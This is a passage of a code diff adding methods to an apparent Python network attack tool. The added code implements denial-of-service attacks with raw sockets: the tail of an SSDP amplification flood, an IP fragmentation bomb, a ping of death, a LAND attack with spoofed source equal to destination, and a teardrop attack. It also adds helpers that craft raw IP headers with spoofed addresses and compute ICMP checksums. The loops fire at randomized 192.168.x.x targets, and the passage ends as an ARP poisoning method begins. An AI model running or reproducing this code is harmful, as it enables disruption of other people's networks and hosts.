+                    self.packets_sent += 1
+                    self.bytes_sent += len(ssdp_request) * 30  # 30x amplification
+                    
+                    time.sleep(1 / self.send_rate if self.send_rate > 0 else 0.001)
+                except:
+                    pass
+            
+            sock.close()
+        except:
+            pass
+    
+    def fragmentation_attack(self):
+        """IP Fragmentation bomb - malformed overlapping fragments (requires root)"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+            
+            while self.attack_active:
+                try:
+                    target = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
+                    
+                    # Create malformed IP fragments with overlapping offsets
+                    ip_id = random.randint(1, 65535)
+                    
+                    # Fragment 1
+                    frag1 = self.craft_ip_header(target, 8, ip_id, 0x2000, offset=0)
+                    frag1 += b'A' * 1000
+                    
+                    # Fragment 2 - overlaps with fragment 1
+                    frag2 = self.craft_ip_header(target, 8, ip_id, 0x2000, offset=50)
+                    frag2 += b'B' * 1000
+                    
+                    # Fragment 3 - final fragment
+                    frag3 = self.craft_ip_header(target, 8, ip_id, 0x0000, offset=100)
+                    frag3 += b'C' * 500
+                    
+                    sock.sendto(frag1, (target, 0))
+                    sock.sendto(frag2, (target, 0))
+                    sock.sendto(frag3, (target, 0))
+                    
+                    self.packets_sent += 3
+                    self.bytes_sent += len(frag1) + len(frag2) + len(frag3)
+                    
+                    time.sleep(0.1)
+                except:
+                    pass
+            
+            sock.close()
+        except:
+            pass
+    
+    def ping_of_death_attack(self):
+        """Ping of Death - oversized ICMP packets (requires root)"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+            
+            while self.attack_active:
+                try:
+                    target = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
+                    
+                    # ICMP echo request header
+                    icmp_type = 8  # Echo request
+                    icmp_code = 0
+                    icmp_checksum = 0
+                    icmp_id = random.randint(1, 65535)
+                    icmp_seq = 1
+                    
+                    # Create oversized payload (>65535 bytes when fragmented)
+                    payload = b'X' * 65500
+                    
+                    # Pack ICMP header
+                    icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
+                    packet = icmp_header + payload
+                    
+                    # Calculate checksum
+                    icmp_checksum = self.calculate_checksum(packet)
+                    icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
+                    packet = icmp_header + payload
+                    
+                    sock.sendto(packet, (target, 0))
+                    
+                    self.packets_sent += 1
+                    self.bytes_sent += len(packet)
+                    
+                    time.sleep(0.1)
+                except:
+                    pass
+            
+            sock.close()
+        except:
+            pass
+    
+    def land_attack(self):
+        """LAND attack - source IP = destination IP (requires root)"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+            
+            while self.attack_active:
+                try:
+                    target = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
+                    port = random.randint(1, 65535)
+                    
+                    # Craft TCP SYN packet where source IP = dest IP
+                    tcp_header = struct.pack('!HHLLBBHHH',
+                        port, port,  # Same source and dest port
+                        0, 0,
+                        (5 << 4), 2,  # SYN flag
+                        8192, 0, 0)
+                    
+                    # IP header with source = dest
+                    ip_header = self.craft_ip_header(target, 6, random.randint(1, 65535), 0, ttl=64, src_ip=target)
+                    
+                    packet = ip_header + tcp_header
+                    sock.sendto(packet, (target, 0))
+                    
+                    self.packets_sent += 1
+                    self.bytes_sent += len(packet)
+                    
+                    time.sleep(0.1)
+                except:
+                    pass
+            
+            sock.close()
+        except:
+            pass
+    
+    def teardrop_attack(self):
+        """Teardrop attack - overlapping IP fragments (requires root)"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
+            
+            while self.attack_active:
+                try:
+                    target = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
+                    ip_id = random.randint(1, 65535)
+                    
+                    # Fragment 1
+                    frag1_data = b'A' * 28
+                    frag1 = self.craft_ip_header(target, 17, ip_id, 0x2000, offset=0) + frag1_data
+                    
+                    # Fragment 2 - overlaps with wrong offset
+                    frag2_data = b'B' * 28
+                    frag2 = self.craft_ip_header(target, 17, ip_id, 0x0000, offset=24) + frag2_data
+                    
+                    sock.sendto(frag1, (target, 0))
+                    sock.sendto(frag2, (target, 0))
+                    
+                    self.packets_sent += 2
+                    self.bytes_sent += len(frag1) + len(frag2)
+                    
+                    time.sleep(0.1)
+                except:
+                    pass
+            
+            sock.close()
+        except:
+            pass
+    
+    def craft_ip_header(self, dest_ip, protocol, ip_id, flags_offset, offset=0, ttl=64, src_ip=None):
+        """Craft raw IP header"""
+        if src_ip is None:
+            src_ip = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
+        
+        ip_ihl = 5
+        ip_ver = 4
+        ip_tos = 0
+        ip_tot_len = 0  # Kernel will fill
+        ip_frag_off = flags_offset | (offset >> 3)
+        ip_ttl = ttl
+        ip_proto = protocol
+        ip_check = 0  # Kernel will fill
+        ip_saddr = socket.inet_aton(src_ip)
+        ip_daddr = socket.inet_aton(dest_ip)
+        
+        ip_ihl_ver = (ip_ver << 4) + ip_ihl
+        
+        ip_header = struct.pack('!BBHHHBBH4s4s',
+                               ip_ihl_ver, ip_tos, ip_tot_len,
+                               ip_id, ip_frag_off,
+                               ip_ttl, ip_proto, ip_check,
+                               ip_saddr, ip_daddr)
+        
+        return ip_header
+    
+    def calculate_checksum(self, data):
+        """Calculate checksum for ICMP"""
+        checksum = 0
+        for i in range(0, len(data), 2):
+            if i + 1 < len(data):
+                checksum += (data[i] << 8) + data[i + 1]
+            else:
+                checksum += data[i] << 8
+        
+        checksum = (checksum >> 16) + (checksum & 0xffff)
+        checksum = ~checksum & 0xffff
+        return checksum
     
     def arp_poison_attack(self):
         """ARP cache poisoning attack (requires scapy and root)"""
